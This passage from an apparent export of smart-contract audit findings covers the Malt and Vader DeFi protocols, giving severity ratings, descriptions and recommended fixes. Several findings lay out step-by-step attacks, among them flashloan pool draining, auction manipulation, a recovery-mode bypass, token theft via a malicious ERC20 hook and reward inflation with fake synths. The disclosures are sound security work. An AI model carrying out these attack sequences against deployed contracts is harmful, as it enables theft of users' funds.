- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L80-L109>
- <https://shouldiusespotpriceasmyoracle.com/>


#### Recommended Mitigation Steps

Consider implementing/integrating a TWAP oracle to track the price of Malt."
59.md,`addLiquidity` Does Not Reset Approval If Not All Tokens Were Added To Liquidity Pool,medium,"`addLiquidity` is called when users reinvest their tokens through bonding events. The `RewardReinvestor` first transfers Malt and rewards tokens before adding liquidity to the token pool. `addLiquidity` provides protections against slippage by a margin of 5%, and any dust token amounts are transferred back to the caller. In this instance, the caller is the `RewardReinvestor` contract which further distributes the dust token amounts to the protocol's treasury. However, the token approval for this outcome is not handled properly. Dust approval amounts can accrue over time, leading to large Uniswap approval amounts by the `UniswapHandler` contract.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L212-L214>
<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L216-L218>

#### Recommended Mitigation Steps

Consider resetting the approval amount if either `maltUsed < maltBalance` or `rewardUsed < rewardBalance` in `addLiquidity`."
59.md,`_distributeRewards` Does Not Reset Approval If Not All Tokens Were Allocated,medium,"`_distributeRewards` attempts to reward LP token holders when the price of Malt exceeds its price target. Malt Finance is able to being Malt back to its peg by selling Malt and distributing rewards tokens to LP token holders. An external call to `Auction` is made via the `allocateArbRewards` function. Prior to this call, the `StabilizerNode` approves the contract for a fixed amount of tokens, however, the `allocateArbRewards` function does not necessarily utilise this entire amount. Hence, dust token approval amounts may accrue from within the `StabilizerNode` contract.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/StabilizerNode.sol#L252-L253>
<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L809-L871>


#### Recommended Mitigation Steps

Consider resetting the approval amount if the input `rewarded` amount to `allocateArbRewards` is less than the output amount."
59.md,AMM pool can be drained using a flashloan and calling `stabilize`,medium,"All of the `rewardToken` in a given AMM pool can be removed from the AMM pool and distributed as LP rewards.

#### Proof of Concept

In the `stabilize` method in the `StabilizerNode` the initial check to see if the Malt price needs to be stabilized it uses a short period TWAP:
<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/StabilizerNode.sol#L156>

However, if the price is above the threshold for stabilization then the trade size required to stabilize looks at the AMM pool directly which is vulnerable to flashloan manipulation.

<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L250-L275>

Attack:

1.  Wait for TWAP to rise above the stabilization threshold
2.  Flashloan remove all but a tiny amount of Malt from the pool.
3.  Call `stabilize`. This will pass the TWAP check and execute `_distributeSupply` which in turn ultimately calls `_calculateTradeSize` in the `UniswapHandler`. This calculation will determine that almost all of the `rewardToken` needs to be removed from the pool to return the price to peg.
4.  Malt will mint enough Malt to remove a lot of the `rewardToken` from the pool.
5.  The protocol will now distribute that received `rewardToken` as rewards. 0.3% of which goes directly to the attacker and the rest goes to LP rewards, swing trader and the treasury.

The amount of money that can be directly stolen by a malicious actor is small but it can cause a lot of pain for the protocol as the pool will be destroyed and confusion around rewards will be created.

#### Recommended Mitigation Steps

Use a short TWAP to calculate the trade size instead of reading directly from the pool."
59.md,Dutch auction can be manipulated,medium,"When malt is under-peg and the swing trader module do not have enough capital to buy back to peg, a Dutch auction is triggered to sell arb token. The price of the Dutch auction decrease linearly toward endprice until \_endAuction() is called. <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Auction.sol#L589>

\_endAuction() is called in

1.  When auction.commitments >= auction.maxCommitments

<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Auction.sol#L212>

2.  On stabilize() -> checkAuctionFinalization() -> \_checkAuctionFinalization()

<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/StabilizerNode.sol#L146>
<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Auction.sol#L754>

3.  On stabilize() ->\_startAuction() -> triggerAuction() -> \_checkAuctionFinalization()

<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/StabilizerNode.sol#L170>
<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Auction.sol#L754>

It is possible manipulate the dutch auction by preventing \_endAuction() being called.

#### Proof of Concept

Consider someone call purchaseArbitrageTokens with auction.maxCommitments minus 1 wei, `_endAuction` won't be called because auction.commitments < auction.maxCommitments. Further purchase would revert because `purchaseAndBurn` (<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Auction.sol#L184>) would likely revert since swapping 1 wei in most AMM will fail due to rounding error. Even if it does not revert, there is no incentive to waste gas to purchase 1 wei of token.

As such, the only way for the auction to finalize is to call stabilize().
However, this is not immediately possible because it require
`block.timestamp >= stabilizeWindowEnd` where
`stabilizeWindowEnd = block.timestamp + stabilizeBackoffPeriod`
stabilizeBackoffPeriod is initially set to 5 minutes in the contract

After 5 minute, stabilize() can be called by anyone. By using this exploit, an attacker can guarantee he can purchase at (startingPrice+endingPrice)/2 or lower, given the default 10 minute auctionLength and 5 minute stabilizeBackoffPeriod. (unless a privileged user call stabilize() which override the stability window)

Also note that stabilize() might not be called since there is no incentive.

#### Recommended Mitigation Steps

1.  Incentivize stabilize() or incentivize a permission-less call to \_endAuction()
2.  Lock-in auction price when user commit purchase


**[0xScotch (sponsor) labeled](https://github.com/code-423n4/2021-11-malt-findings/issues/375) sponsor confirmed**"
59.md,Slippage checks when adding liquidity are too strict,medium,"When adding liquidity through `UniswapHandler.addLiquidity`, the entire contract balances are used to add liquidity and the min amounts are set to 95% of these balances.
If the balances in this contract are unbalanced (the ratio is not similar to the current Uniswap pool reserve ratios) then this function will revert and no liquidity is added.

See `UniswapHandler.buyMalt`:

```solidity
(maltUsed, rewardUsed, liquidityCreated) = router.addLiquidity(
  address(malt),
  address(rewardToken),
  maltBalance, // @audit-info amountADesired
  rewardBalance,
  // @audit assumes that whatever is in this contract is already balanced. good assumption?
  maltBalance.mul(95).div(100), // @audit-info amountAMin
  rewardBalance.mul(95).div(100),
  msg.sender, // transfer LP tokens to sender
  now
);
```

#### Impact

If the contract has unbalanced balances, then the `router.addLiquidity` call will revert.
Note that an attacker could even send tokens to this contract to make them unbalanced and revert, resulting in a griefing attack.

#### Recommended Mitigation Steps

It needs to be ensured that the balances in the contract are always balanced and match the current reserve ratio.
It might be better to avoid directly using the balances which can be manipulated by transferring tokens to the contract and accepting parameters instead of how many tokens to provide liquidity with from the caller side."
59.md,Bonding.sol _unbondAndBreak does not account for edge case where no tokens are returned,medium,"In Bonding.sol, the internal function `_unbondAndBreak` transfers a user's stake tokens to the dexHandler and then calls `removeLiquidity` on the dexHandler. Within the Uniswap handler (which is the only handler so far) `removeLiquidity` takes special care in the edge case where `router.removeLiquidity` returns zero tokens. Specifically, the Uniswap handler has this code:

```solidity
if (amountMalt == 0 || amountReward == 0) {
  liquidityBalance = lpToken.balanceOf(address(this));
  lpToken.safeTransfer(msg.sender, liquidityBalance);
  return (amountMalt, amountReward);
}
```

If this edge case does indeed happen (i.e. if something is preventing the Uniswap router from removing liquidity at the moment), then the Uniswap handler will transfer the LP tokens back to Bonding.sol. However, Bonding.sol does not have any logic to recognize that this happened, so the LP tokens will become stuck in the contract and the user will never get any of their value back. This could be very bad if the user unbonds a lot of LP and they don't get any of it back.

#### Proof of Concept

See `_unbondAndBreak` here: <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Bonding.sol#L226>

Notice how the edge case where `amountMalt == 0 || amountReward == 0` is not considered in this function, but it is considered in the Uniswap handler's `removeLiquidity` here: <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/DexHandlers/UniswapHandler.sol#L240>

#### Recommended Mitigation Steps

Add a similar edge case check to `_unbondAndBreak`. In the case where LP tokens are transferred back to Bonding.sol instead of malt/reward, these LP tokens should be forwarded back to the user since the value is rightfully theirs."
59.md,User can bypass Recovery Mode via UniswapHandler to buy Malt,medium,"One of the innovative feature of Malt is to block buying while under peg. The buy block can be bypassed by swapping to the whitelisted UniswapHandler, and then extract the token by abusing the add and remove liquidity function. This is considered a high severity issue because it undermine to protocol's ability to generate profit by the privileged role as designed and allow potential risk-free MEV.

#### Proof of Concept

1.  User swap dai into malt and send malt directly to uniswapHandler, this is possible becuase uniswapHandler is whitelisted

`swapExactTokensForTokens(amountDai, 0, [dai.address, malt.address], uniswapHandler.address, new Date().getTime() + 10000);`
2\) User send matching amount of dai to uniswapHandler
3\) User call addLiquidity() and get back LP token
4\) User call removeLiquidity() and get back both dai and malt

#### Recommended Mitigation Steps

According to documentation in <https://github.com/code-423n4/2021-11-malt#high-level-overview-of-the-malt-protocol>

> Users wanting to remove liquidity can still do so via the UniswapHandler contract that is whitelisted in recovery mode.

, this should be exploitable. Meanwhile the current implementation did not actually allow remove liquidity during recovery mode (refer to issue ""Unable to remove liquidity in Recovery Mode"")
This exploit can be mitigated by disabling addLiquidity() when the protocol is in recovery mode"
59.md,Malt Protocol Uses Stale Results From `MaltDataLab` Which Can Be Abused By Users,medium,"`MaltDataLab` integrates several `MovingAverage` contracts to fetch sensitive data for the Malt protocol. Primary data used by the protocol consists of the real value for LP tokens, the average price for Malt and average reserve ratios. `trackMaltPrice`, `trackPoolReserves` and `trackPool` are called by a restricted role denoted as the `UPDATER_ROLE` and represented by an EOA account and not another contract. Hence, the EOA account must consistently update the aforementioned functions to ensure the most up-to-date values. However, miners can censor calls to `MaltDataLab` and effectively extract value from other areas of the protocol which use stale values.

#### Proof of Concept

Consider the following attack vector:

*   The price of Malt exceeds the lower bound threshold and hence `stabilize` can be called by any user.
*   The `_stabilityWindowOverride` function is satisfied, hence the function will execute.
*   The state variable, `exchangeRate`, queries `maltPriceAverage` which may use an outdated exchange rate.
*   `_startAuction` is executed which rewards `msg.sender` with 100 Malt as an incentive for triggering an auction.
*   As the price is not subsequently updated, a malicious attacker could collude with a miner to censor further pool updates and continue calling `stabilize` on every `fastAveragePeriod` interval to extract incentive payments.
*   If the payments exceed what the `UPDATER_ROLE` is willing to pay to call `trackMaltPrice`, a user is able to sustain this attack.

This threatens the overall stability of the protocol and should be properly handled to prevent such attacks. However, the fact that `MaltDataLab` uses a series of spot price data points to calculate the `MovingAverage` also creates an area of concern as well-funded actors could still manipulate the `MovingAverage` contract by sandwiching calls to `trackMaltPrice`, `trackPool` and `trackPoolReserves`.

`trackMaltPrice`, `trackPool`, and `trackPoolReserves` should be added to the following areas of the code where applicable.
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Bonding.sol#L159>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Bonding.sol#L173>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Bonding.sol#L177>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L881>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L710>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/StabilizerNode.sol#L156>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/StabilizerNode.sol#L190>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/ImpliedCollateralService.sol#L105>


#### Recommended Mitigation Steps

Consider adding calls to `trackMaltPrice`, `trackPoolReserves` and `trackPool` wherever the values are impacted by the protocol. This should ensure the protocol is tracking the most up-to-date values. Assuming the cumulative values are used in the `MovingAverage` contracts, then sensitive calls utilising `MaltDataLab` should be protected from flashloan attacks. However, currently this is not the case, rather `MovingAverage` consists of a series of spot price data points which can be manipulated by well-funded actors or via a flashloan. Therefore, there needs to be necessary changes made to `MaltDataLab` to use cumulative price updates as its moving average instead of spot price."
5.md,Unhandled return value of transfer in `transferOut()` of Pools.sol,high,"ERC20 implementations are not always consistent. Some implementations of transfer and `transferFrom` could return ‘false’ on failure instead of reverting. It is safer to wrap such calls into `require()` statements to handle these failures.

The transfer call [on L211](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L211) of `transferOut()` could be made on a user-supplied untrusted token address (from the different call sites) whose implementation can be malicious.

For reference, see similar finding from Consensys Diligence Audit of AAVE Protocol V2

Recommend requirements to check the return value and revert on 0/false or use OpenZeppelin’s SafeERC20 wrapper functions."
5.md,Flash attack mitigation does not work as intended in USDV.sol,high,"One of the stated protocol (review) goals is to detect susceptibility to “Any attack vectors using flash loans on Anchor price, synths or lending.” As such, USDV contract aims to protect against flash attacks using `flashProof()` modifier which uses the following check in `isMature()` to determine if currently executing contract context is at least `blockDelay` duration ahead of the previous context: ```lastBlock[tx.origin] + blockDelay <= block.number```

However, `blockDelay` state variable is not initialized which means it has a default uint value of 0. So unless it is set to >= 1 by `setParams()` which can be called only by the DAO (which currently does not have the capability to call `setParams()` function), `blockDelay` will be 0, which allows current executing context (`block.number`) to be the same as the previous one (`lastBlock[tx.origin]`). This effectively allows multiple calls on this contract to be executed in the same transaction of a block which enables flash attacks as opposed to what is expected as commented on [L41](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/USDV.sol#L140-L142): ""// Stops an EOA from doing a flash attack in the same block""

Even if the DAO can call `setParams()` to change `blockDelay` to >= 1, there is a big window of opportunity for flash attacks until the DAO votes, finalizes and approves such a proposal. Moreover, such proposals can be cancelled by a DAO minority or replaced by a malicious DAO minority to launch flash attacks.

Recommend initalizing `blockDelay` to >= 1 at declaration or in constructor.


> > `blockDelay` state variable is not initialized
>
> It is intended to be initialised to 1, so this is a bug. Severity: 2"
5.md,Missing DAO functionality to call `changeDAO()` function in Vader.sol,high,"`changeDAO()` is authorized to be called only from the DAO (per modifier) but DAO contract has no corresponding functionality to call `changeDAO()` function. As a result, DAO address cannot be changed ([L192-L196](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L192-L196)).

Recommend adding functionality to DAO to be able to call `changeDAO()` of Vader.sol.

:
> [#46](https://github.com/code-423n4/2021-04-vader-findings/issues/46)

:
 > Unlike in issues #140, #157, #158, & #159; without this functionality, missing functionality in the DAO becomes a very serious issue. As a result, this one is very high risk were it to be overlooked."
5.md,Proposals can be cancelled,high,"Anyone can cancel any proposals by calling `DAO.cancelProposal(id, id)` with `oldProposalID == newProposalID`.
This always passes the minority check as the proposal was approved.

An attacker can launch a denial of service attack on the DAO governance and prevent any proposals from being executed.

Recommend checking that `oldProposalID` == `newProposalID`"
5.md,Flash loans can affect governance voting in DAO.sol,high,"Flash loans can significantly increase a single voter's weight and be used to impact the voting outcome. A voter can borrow a significant quantity of tokens to increase their voting weight in a transaction within which, they also deterministically  influence the voting outcome to their choice.

This has already happened in the case of MakerDAO governance where [a flash loan was used to affect voting outcome](https://forum.makerdao.com/t/urgent-flash-loans-and-securing-the-maker-protocol/4901) and noted by the Maker team as: “a practical example for the community that flash loans can and may impact system governance”

Given that flash loans are a noted concern, the impact of it to DAO governance which can control all critical protocol parameters should be mitigated as in other places.

Recommend accounting for flash loans in `countMemberVotes()` by using weight from previous blocks or consider capping the weight of individual voters. ([L158-L163](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/DAO.sol#L158-L163))"
5.md,Incorrect burn address in Vader.sol,high,"The `internal _transfer()` function is called from external facing `transfer()`, `transferFrom()`, and `transferTo()` functions all of which have different sender addresses. It is `msg.sender` for `transfer()`, sender parameter for `transferFrom()` and `tx.origin` for `transferTo()`.

These different senders are reflected in the sender parameter of `_transfer()` function. While this sender parameter is correctly used for transfer of tokens within `_transfer`, the call to `_burn()` on L129 incorrectly uses `msg.sender` as the burn address which is correct only in the case of the `transfer()` caller's context. This is incorrect for `transferFrom()` and `transferTo()` caller contexts.

This will incorrectly burn the fees from a different (intermediate contract) account for all users of the protocol interacting with the `transferTo()` and `transferFrom()` functions and lead to incorrect accounting of token balances or exceptional conditions. Protocol will break and lead to fund loss.

Recommend changing L129 to: `_burn(sender, _fee);`"
5.md,Wrong `calcAsymmetricShare` calculation,high,"The inline-comment defines the number of asymmetric shares as `(u * U * (2 * A^2 - 2 * U * u + U^2))/U^3` but the `Utils.calcAsymmetricShare` function computes `(uA * 2U^2 - 2uU + u^2) / U^3` which is not equivalent as can be seen from the `A^2` term in the first term which does not occur in the second one.

The associativity on `P * part1` is wrong, and `part2` is not multiplied by `P`.

The math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as the asymmetric share (which is used to determine the collateral value in base tokens) could be wrong. For example, it might be possible to borrow more than the collateral put up.

Recommend clarifying if the comment or the code is correct and fix them if not."
5.md,Wrong liquidity units calculation,high,"The spec defines the number of LP units to be minted as `units = (P (a B + A b))/(2 A B) * slipAdjustment = P * (part1 + part2) / part3 * slipAdjustments` but the `Utils.calcLiquidityUnits` function computes `((P * part1) + part2) / part3 * slipAdjustments`.

The associativity on `P * part1` is wrong, and `part2` is not multiplied by `P`.

The math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as redeeming the minted LP tokens does not result in the initial tokens anymore.

Recommend fixing the equation."
5.md,Incorrect initialization gives IL protection of only 1 second instead of 100 days in Router.sol,high,"Incorrect initialization of `timeForFullProtection` to 1 sec instead of 8640000 secs (100 days) as indicated in code comments, appears to be a test setting mistakenly carried over for deployment. Therefore, unless `timeForFullProtection` is reset to 100 days by `setParams()` (calling this function is a missing functionality in the DAO currently), the Impermanent Loss (IL) protection ""rule"" of 100 days will not apply in `Utils.getProtection()`.

This breaks a key value proposition of the Vader protocol which is IL protection as indicated in the specification:
> “Impermanent Loss Protection: The deposit value for each member is recorded when they deposit. When they go to withdraw, the redemption value is computed. If it is less than the deposit value, the member is paid the deficit from the reserve. The protection issued increases from 0 to 100% linearly for 100 days.”

Recommend changing to ```“timeForFullProtection = 8640000; //100 days” ``` on L84"
5.md,Anyone can list anchors / curate tokens,high,"The `Router.listAnchor` function can be called by anyone and tokens can be added. The only check is that `require(iPOOLS(POOLS).isAnchor(token));` but this can easily be set by calling `Pools.addLiquidity(VADER, token, _)` once even without actually sending any tokens to the contract. This makes it an essentially useless check.

This only works initially as long as the `anchorLimit` has not been reached yet.
However, the `replaceAnchor` can be used in the same way and flash loans can be used to get around the liquidity restrictions and push another anchor token out of the price range as these checks use the current reserves.

Anchored pools are automatically curated pools and determine if a pool receives rewards. An attacker can remove rewards of a curated pool this way and add rewards to their own pool with a custom token they control.

After a pool has been anchored through flash loans, liquidity can be withdrawn which could make the anchor price easy to manipulate in the next block and launch other attacks.

Recommend revisiting the `_isAnchor[token] = true;` statement in `addLiquidity`, it seems strange without any further checks.
Consider making `listAnchor` / `replaceAnchor` DAO-only functions and make them flash-loan secure.
One should probably use time-weighted prices for these pools for the bounds check."
5.md,Swap token can be traded as fake base token,high,"The `Pools.swap` function does not check if `base` is one of the base tokens. One can transfer `token`s to the pool and set `base=token` and call `swap(token, token, member, toBase=false)`

The `_actualInput = getAddedAmount(base, token);` will return the **token** amount added but use the ratio compared to the **base** reserve `calcSwapOutput(_actualInput=tokenInput, mapToken_baseAmount[token], mapToken_tokenAmount[token]); = tokenIn / baseAmount * tokenAmount` which yields a wrong swap result.

It breaks the accounting for the pool as `token`s are transferred in, but the `base` balance is increased (and `token` balance decreased). LPs cannot correctly withdraw again, and others cannot correctly swap again.

Another example scenario is that the token pool amount can be stolen.
Send `tokenIn=baseAmount` of tokens to the pool and call `swap(base=token, token, member, toBase=false)`. Depending on the price of `token` relative to `base` this could be cheaper than trading with the base tokens.

Recommend checking that `base` is either `USDV` or `VADER`."
5.md,`getAddedAmount` can return wrong results,high,"The `getAddedAmount` function only works correctly when called with `(VADER/USDV, pool)` or `(pool, pool)`.
However, when called with (`token, pool)` where `token` is neither `VADER/USDV/pool`, it returns the wrong results:

1. It gets the `token` balance
2. And subtracts it from the stored `mapToken_tokenAmount[_pool]` amount which can be that of a completely different token

Anyone can break individual pairs by calling `sync(token1, token2)` where the `token1` balance is less than `mapToken_tokenAmount[token2]`. This will add the difference to `mapToken_tokenAmount[token2]` and break the accounting and result in a wrong swap logic.

Furthermore, this can also be used to swap tokens without having to pay anthing with `swap(token1, token2, member, toBase=false)`.

Recommend adding a require statement in the `else` branch that checks that `_token == _pool`."
5.md,4 Synths can be minted with fake base token,high,"The `Pools.mintSynth` function does not check if `base` is one of the base tokens. One can transfer `token`s to the pool and set `base=token` and call `mintSynth(token, token, member)`.

The `_actualInput = getAddedAmount(base, token);` will return the **token** amount added but use the ratio compared to the **base** reserve `calcSwapOutput(_actualInput=tokenInput, mapToken_baseAmount[token], mapToken_tokenAmount[token]); = tokenIn / baseAmount * tokenAmount` which yields a wrong swap result.

It breaks the accounting for the pool as `token`s are transferred in, but the `base` balance is increased.

The amount that is minted could also be inflated (cheaper than sending the actual base tokens), especially if `token` is a high-precision token or worth less than base.

Recommend checking that `base` is either `USDV` or `VADER` in `mintSynth`."
5.md,Missing access restriction on `lockUnits/unlockUnits`,high,"The `Pool.lockUnits` allows anyone to steal pool tokens from a `member` and assign them to `msg.sender`. Anyone can steal pool tokens from any other user.

Recommend adding access control and require that `msg.sender` is the router or another authorized party."
5.md,Wrong slippage protection on Token -> Token trades,high,"The `Router.swapWithSynthsWithLimit` allows trading token to token and specifying slippage protection. A token to token trade consists of two trades:

1. token to base
2. base to token

The slippage protection of the second trade (base to token) is computed wrong:

```solidity
require(iUTILS(UTILS()).calcSwapSlip(
    inputAmount, // should use outToken here from prev trade
    iPOOLS(POOLS).getBaseAmount(outputToken)
  ) <= slipLimit
);
```

It compares the **token** input amount (of the first trade) to the **base** reserve of the second pair.

Slippage protection fails and either the trade is cancelled when it shouldn't be or it is accepted even though the user suffered more losses than expected.

Recommend it should use the base output from the first trade to check for slippage protection. Note that this still just computes the slippage protection of each trade individually. An even better way would be to come up with a formula to compute the slippage on the two trades at once."
5.md,Tokens can be stolen through `transferTo`,high,"I know that it's stated that:

> VADER, USDV, SYNTHS all employ the `transferTo()` function, which interrogates for `tx.origin` and skips approvals. The author does not subscribe to the belief that this is dangerous

In my opinion, it can be very dangerous. Imagine the following scenario:

1. I create a custom attacker ERC20 token that has a hook in the `_transfer` function that checks tx.origin for USDV/VADER/SYNTHS and calls `transferTo` to steal these funds.
2. I set up a honeypot by providing liquidity to the `BASE <> ATTACKER` pool.
3. I target high-profile accounts holdinging VADER/USDV/SYNTHS and airdrop them free tokens.
4. Block explorers / Vader swap websites could show that this token has value and can be traded for actual `BASE` tokens.
5. User wants to sell the airdropped `ATTACKER` token to receive valuable tokens through the Vader swap and has all their tokens (that are even completely unrelated to the tokens being swapped) stolen.

In general, a holder of any of the core assets of the protocol risks all their funds being stolen if they ever interact with an unvetted external contract/token.
This could even be completely unrelated to the VADER protocol.

Recommend removing `transferTo` and use `permit` + `transferFrom` instead to move tokens from `tx.origin`.


> Do not interact with attack contracts, interacting with an ERC20 is an attack contract."
5.md,Transfer fee is burned on wrong accounts,high,"The `Vader._transfer` function burns the transfer fee on `msg.sender` but this address might not be involved in the transfer at all due to `transferFrom`.

Smart contracts that simply relay transfers like aggregators have their Vader balance burned or the transaction fails because these accounts don't have any balance to burn, breaking the functionality.

Recommend that It should first increase the balance of `recipient` by the full amount and then burn the fee on the `recipient`."
5.md,Vault rewards can be gamed,high,"The `_deposit` function increases the member's _weight_ by `_weight = iUTILS(UTILS()).calcValueInBase(iSYNTH(_synth).TOKEN(), _amount);` which is the swap output amount when trading the deposited underlying synth amount.

Notice that anyone can create synths of custom tokens by calling `Pools.deploySynth(customToken)`.

Therefore an attacker can deposit valueless custom tokens and inflate their member weight as follows:

1. Create a custom token and issue lots of tokens to the attacker
2. Create synth of this token
3. Add liquidity for the `TOKEN <> BASE` pair by providing a single wei of `TOKEN` and `10^18` BASE tokens. This makes the `TOKEN` price very expensive.
4. Mint some synths by paying BASE to the pool
5. Deposit the fake synth, `_weight` will be very high because the token pool price is so high.

Call `harvest(realSynth)` with a synth with actual value. This will increase the synth balance and it can be withdrawn later.

Anyone can inflate their member weight through depositing a custom synth and earn almost all vault rewards by calling `harvest(realSynth)` with a valuable ""real"" synth.
The rewards are distributed pro rata to the member weight which is independent of the actual synth deposited.

The `calcReward` function completely disregards the `synth` parameter which seems odd.
Recommend thinking about making the rewards based on the actual synths deposited instead of a ""global"" weight tracker.
Alternatively, whitelist certain synths that count toward the weight, or don't let anyone create synths."
5.md,Vault rewards last claim time not always initialized,high,"The `harvest` calls `calcCurrentReward` which computes `_secondsSinceClaim = block.timestamp - mapMemberSynth_lastTime[member][synth];`.  As one can claim different synths than the synths that they deposited, `mapMemberSynth_lastTime[member][synth]` might still be uninitialized and the `_secondsSinceClaim` becomes the current block timestamp.

The larger the `_secondsSinceClaim` the larger the rewards.
This bug allows claiming a huge chunk of the rewards.

Recommend letting users only harvest synths that they deposited."
5.md,Vault Weight accounting is wrong for withdrawals,high,"When depositing two different synths, their weight is added to the same `mapMember_weight[_member]` storage variable.
When withdrawing the full amount of one synth with `_processWithdraw(synth, member, basisPoints=10000` the full weight is decreased.

The second deposited synth is now essentially weightless.

Users that deposited more than one synth can not claim their fair share of rewards after a withdrawal.

Recommed that the weight should be indexed by the synth as well."
5.md,Anyone Can Avoid All Vether Transfer Fees By Adding Their Address to the Vether `ExcludedAddresses` List.,high,"`Vether.sol` implements a fee on every token transfer, unless either the sender or the recipient exists on a list of excluded addresses `(mapAddress_Excluded)`. However, the `addExcluded()` function in `Vether.sol` has no restrictions on who can call it.
So any user can call `addExcluded` with their own address as the argument, and bypass all transfer fees.

Alice calls:

(1) ```Vether.addExcluded(aliceAddress)```, which adds Alice's address to `mapAddress_Excluded`.
(2) Alice can now freely transfer Vether with no fees.

Recommend adding restrictions to who can call `addExcluded`, perhaps by restricting it to a caller set by `DAO.sol`



**moneylegobatman (C4 Editor) commented:**
> Leaving report and discussion in for transparency, since finding was awarded."
5.md,Users may unintentionally remove liquidity under a phishing attack.,high,"The `removeLiquidity` function in `Pools.sol` uses `tx.origin` to determine the person who wants to remove liquidity. However, such a design is dangerous since the pool assumes that this function is called from the router, which may not be true if the user is under a phishing attack, and he could unintentionally remove liquidity.

Referenced code: [Pool.sol#L77-L79](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L77-L79)

Recommend consider making the function `_removeLiquidity` external, which can be utilized by the router, providing information of which person removes his liquidity.


> Vader's security assumption is a user is not phished."
5.md,Anyone can curate pools and steal rewards,high,"The `Router.curatePool` and `replacePool` don't have any access restriction.
An attacker can get a flash loan of base tokens and replace existing curated pools with their own curated pools.

Curated pools determine if a pool receives rewards. An attacker can remove rewards of a curated pool this way and add rewards to their own pool with a custom token they control.
They can then go ahead and game the reward system by repeatedly swapping in their custom pool with useless tokens, withdraw liquidity, and in the end, pay back the base flashloan.

Recommend preventing the replacing of curations through flash loans. Also, consider making pool curations DAO-exclusive actions."
5.md,Incorrect initialization causes VADER emission rate of 1 second instead of 1 day in Vader.sol,high,"Incorrect initialization (perhaps testing parameterization mistakenly carried over to deployment) of `secondsPerEra` to 1 sec instead of 86400 secs (1 day) causes what should be the daily emission rate to be a secondly emission rate.

This causes inflation of VADER token and likely breaks VADER<>USDV peg and other protocol invariants. Protocol will break and funds will be lost.

Recommend Initializing `secondsPerEra` to 86400 on L67."
5.md,User may not get IL protection if certain functions are called directly in `Pools.sol`,medium,"Functions `removeLiquidity()` and `removeLiquidityDirectly()` when called directly, do not provide the the user with IL protection unlike when calling the corresponding `removeLiquidity()` function in `Router.sol`. This should be prevented, at least for `removeLiquidity()` or highlighted in the specification and user documentation.

Recommend adding access control (e.g. via a modifier `onlyRouter`) so `removeLiquidity()` function of Pools contract can be called only from corresponding Router contract’s `removeLiquidity()` function which provides IL protection. Alternatively, highlight in the specification and user documentation about which contract interfaces provide IL protection to users."
5.md,Undefined behavior for DAO and GRANT vote proposals in `DAO.sol`,medium,"Given that there are only three proposal types (GRANT, UTILS, REWARD) that are actionable, it is unclear if 'DAO' type checked in `voteProposal()` is a typographical error and should really be 'GRANT'. Otherwise, GRANT proposals will only require quorum (33%) and not majority (50%).

Recommend changing ‘DAO’ on L83 to ‘GRANT’ or if not, specify what DAO proposals are and how GRANT proposals should be handled with quorum or majority.

Also, check and enforce that `mapPID_types` are only these three actionable proposal types: GRANT, UTILS, REWARD."
5.md,Lack of input validation in `replacePool()` allows curated pool limit bypass in `Router.sol`,medium,"There is no input validation in `replacePool()` function to check if `oldToken` exists and is curated. Using a non-existing `oldToken` (even 0 address) passes the check on L236 (because `Pools.getBaseAmount()` will return 0 for the non-existing token) and `newToken` will be made curated. This can be used to bypass the `curatedPoolLimit` enforced only in `curatePool() function`.

Recommend checking if `oldToken` exists and is curated as part of input validation in `replacePool()` function."
5.md,`flashProof` is not flash-proof,medium,"The `flashProof` modifier is supposed to prevent flash-loan attacks by disallowing performing several sensitive functions in the same block.

However, it performs this check on `tx.origin` and not on an individual user address basis. This only prevents flash loan attacks from happening within a single transaction.

